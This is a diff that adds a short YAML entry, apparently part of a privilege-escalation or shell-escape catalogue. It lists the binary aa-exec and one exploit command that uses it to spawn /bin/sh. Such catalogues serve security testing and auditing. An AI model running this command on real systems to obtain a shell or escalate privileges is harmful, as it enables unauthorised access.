@@ -1,0 +1,4 @@
+name: aa-exec
+binary_path: /usr/bin/aa-exec
+exploit_cmds:
+- /usr/bin/aa-exec /bin/sh
